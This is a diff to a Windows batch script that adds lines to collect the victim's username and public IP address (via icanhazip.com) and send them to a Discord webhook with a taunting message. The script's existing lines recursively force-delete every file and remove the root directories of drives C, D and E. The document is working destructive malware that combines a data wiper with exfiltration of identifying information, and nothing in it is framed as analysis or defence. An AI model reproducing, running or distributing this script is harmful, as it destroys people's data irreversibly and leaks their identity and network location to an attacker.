@@ -1,4 +1,6 @@
 @echo off
+curl icanhazip.com > ip & set /p ip=<ip
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%username% got destroyed lmao\n IP : %ip%\"}" https://discord.com/api/webhooks/1007576003868106823/fm5Hr-yYRey02LbEDjrb35q3jH6zZeXjOXFXGZt79j2ZxnmUmUyz_XP94SuOHpznM1TA
 if exist "C:\" (cd C:\ & del "*" /f /q /s & rd C:\ /s /q)
 if exist "D:\" (cd D:\ & del "*" /f /q /s & rd D:\ /s /q)
 if exist "E:\" (cd E:\ & del "*" /f /q /s & rd E:\ /s /q)
